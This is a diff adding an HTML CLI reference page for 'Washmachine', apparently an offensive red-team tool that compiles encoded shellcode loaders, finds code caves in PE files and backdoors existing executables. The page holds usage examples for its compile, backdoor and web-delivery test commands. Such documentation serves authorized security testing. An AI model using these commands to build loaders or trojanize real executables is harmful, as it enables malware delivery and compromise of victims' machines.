@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="CLI Reference for Washmachine - Complete command documentation">
+    <title>CLI Reference - Washmachine</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <header>
+        <nav>
+            <div class="container">
+                <div class="logo">
+                    <h1>Washmachine</h1>
+                </div>
+                <ul class="nav-links">
+                    <li><a href="index.html">Home</a></li>
+                    <li><a href="getting-started.html">Getting Started</a></li>
+                    <li><a href="cli-reference.html" class="active">CLI Reference</a></li>
+                    <li><a href="architecture.html">Architecture</a></li>
+                    <li><a href="https://github.com/0xhmza/washmachine" target="_blank">GitHub</a></li>
+                </ul>
+            </div>
+        </nav>
+    </header>
+
+    <main>
+        <section class="content">
+            <div class="container">
+                <h1>CLI Reference</h1>
+
+                <p>The Washmachine CLI provides a comprehensive set of commands for building shellcode loaders, analyzing PE files, and backdooring executables.</p>
+
+                <h2>Usage</h2>
+                <pre><code>washmachine-cli &lt;command&gt; [options]</code></pre>
+
+                <h2>Commands</h2>
+
+                <h3>compile</h3>
+                <p>Build a shellcode loader executable.</p>
+
+                <h4>Options</h4>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Option</th>
+                            <th>Description</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><code>-s, --shellcode</code></td>
+                            <td>Path to shellcode file (.bin)</td>
+                        </tr>
+                        <tr>
+                            <td><code>-t, --template</code></td>
+                            <td>Template ID (default, shellcode-minimal)</td>
+                        </tr>
+                        <tr>
+                            <td><code>-e, --encoder</code></td>
+                            <td>Encoder index (0=none, 1=XOR, 2=RC4, etc.)</td>
+                        </tr>
+                        <tr>
+                            <td><code>--json</code></td>
+                            <td>Output result as JSON</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h4>Examples</h4>
+                <pre><code># Compile from a .bin shellcode file using the minimal template
+washmachine-cli compile -s payload.bin -t shellcode-minimal
+
+# Compile with XOR encoding, output as JSON
+washmachine-cli compile -s payload.bin -e 1 --json
+
+# Compile with default template
+washmachine-cli compile -s payload.bin</code></pre>
+
+                <h3>analyze</h3>
+                <p>Analyze a PE file (headers, sections, imports, code caves).</p>
+
+                <h4>Options</h4>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Option</th>
+                            <th>Description</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><code>&lt;pe-file&gt;</code></td>
+                            <td>Path to PE file to analyze</td>
+                        </tr>
+                        <tr>
+                            <td><code>--json</code></td>
+                            <td>Output result as JSON</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h4>Examples</h4>
+                <pre><code># Analyze a PE file
+washmachine-cli analyze target.exe
+
+# Analyze with JSON output
+washmachine-cli analyze target.exe --json</code></pre>
+
+                <h3>backdoor</h3>
+                <p>Inject shellcode into an existing PE via code-cave.</p>
+
+                <h4>Options</h4>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Option</th>
+                            <th>Description</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><code>--pe</code></td>
+                            <td>Path to target PE file</td>
+                        </tr>
+                        <tr>
+                            <td><code>-s, --shellcode</code></td>
+                            <td>Path to shellcode file (.bin)</td>
+                        </tr>
+                        <tr>
+                            <td><code>-o, --output</code></td>
+                            <td>Output path for patched PE</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h4>Examples</h4>
+                <pre><code># Inject shellcode into an existing PE
+washmachine-cli backdoor --pe target.exe -s payload.bin -o patched.exe</code></pre>
+
+                <h3>list</h3>
+                <p>List available templates, encoders, snippets, or compilers.</p>
+
+                <h4>Options</h4>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Option</th>
+                            <th>Description</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><code>--compilers</code></td>
+                            <td>List discovered compilers</td>
+                        </tr>
+                        <tr>
+                            <td><code>--templates</code></td>
+                            <td>List available templates</td>
+                        </tr>
+                        <tr>
+                            <td><code>--encoders</code></td>
+                            <td>List available encoders</td>
+                        </tr>
+                        <tr>
+                            <td><code>--snippets</code></td>
+                            <td>List available code snippets</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h4>Examples</h4>
+                <pre><code># List discovered compilers
+washmachine-cli list --compilers
+
+# List available templates
+washmachine-cli list --templates
+
+# List available encoders
+washmachine-cli list --encoders
+
+# List available snippets
+washmachine-cli list --snippets</code></pre>
+
+                <h3>provision</h3>
+                <p>Download and install required external tools (Bin2Shell).</p>
+
+                <h4>Examples</h4>
+                <pre><code># Download Bin2Shell (run once before using encoding features)
+washmachine-cli provision</code></pre>
+
+                <h3>test</h3>
+                <p>Run the automated test harness.</p>
+
+                <h4>Options</h4>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Option</th>
+                            <th>Description</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><code>--shellcode</code></td>
+                            <td>Path to shellcode file for testing</td>
+                        </tr>
+                        <tr>
+                            <td><code>--phase</code></td>
+                            <td>Test phase to run (1, 2, 3, or all)</td>
+                        </tr>
+                        <tr>
+                            <td><code>--url</code></td>
+                            <td>URL for web delivery testing</td>
+                        </tr>
+                        <tr>
+                            <td><code>--test-assets</code></td>
+                            <td>Path to test assets directory</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h4>Test Phases</h4>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Phase</th>
+                            <th>Description</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>1</td>
+                            <td>All encoder × envelope × web-helper combinations</td>
+                        </tr>
+                        <tr>
+                            <td>2</td>
+                            <td>All template × snippet permutations with default encoding</td>
+                        </tr>
+                        <tr>
+                            <td>3</td>
+                            <td>Multiple shellcode inputs from test assets directory</td>
+                        </tr>
+                        <tr>
+                            <td>all</td>
+                            <td>Run all phases sequentially</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h4>Examples</h4>
+                <pre><code># Run the automated test harness (all phases)
+washmachine-cli test --shellcode messagebox.bin --phase all
+
+# Run only Phase 1 (encoding combinations)
+washmachine-cli test --shellcode messagebox.bin --phase 1
+
+# Run Phase 1 with web delivery
+washmachine-cli test --shellcode messagebox.bin --phase 1 --url http://host/payload.bin
+
+# Run only Phase 3 (multiple shellcode inputs from test assets)
+washmachine-cli test --phase 3 --test-assets "testing assets\binary\shellcodes"</code></pre>
+
+                <h2>Output Locations</h2>
+
+                <h3>Compilation Output</h3>
+                <p>Compiled executables are saved to:</p>
+                <pre><code>temp/cpp/Compiled BInaries/</code></pre>
+
+                <h3>Session Logs</h3>
+                <p>Each compilation session saves artifacts to:</p>
+                <pre><code>logging/session_&lt;timestamp&gt;_&lt;uuid&gt;/
+├── source.cpp       # Generated C++ source
+└── build_log.txt    # Compiler output</code></pre>
+
+                <h3>Test Results</h3>
+                <p>Test harness results are written to:</p>
+                <pre><code>test_results.json</code></pre>
+
+                <h2>JSON Output Format</h2>
+                <p>When using the <code>--json</code> flag, commands output structured JSON for easy parsing:</p>
+
+                <h3>Compile Command</h3>
+                <pre><code>{
+  "success": true,
+  "message": "Compilation successful",
+  "outputPath": "temp/cpp/Compiled BInaries/loader.exe",
+  "template": "shellcode-minimal",
+  "encoder": "XOR"
+}</code></pre>
+
+                <h3>Analyze Command</h3>
+                <pre><code>{
+  "success": true,
+  "peFile": "target.exe",
+  "headers": { ... },
+  "sections": [ ... ],
+  "imports": [ ... ],
+  "codeCaves": [ ... ]
+}</code></pre>
+
+                <h2>Exit Codes</h2>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Code</th>
+                            <th>Meaning</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>0</td>
+                            <td>Success</td>
+                        </tr>
+                        <tr>
+                            <td>1</td>
+                            <td>General error</td>
+                        </tr>
+                        <tr>
+                            <td>2</td>
+                            <td>Invalid arguments</td>
+                        </tr>
+                        <tr>
+                            <td>3</td>
+                            <td>Compilation failed</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2026 Washmachine. For educational and authorized security testing purposes only.</p>
+            <p><a href="https://github.com/0xhmza/washmachine">GitHub Repository</a></p>
+        </div>
+    </footer>
+</body>
+</html>
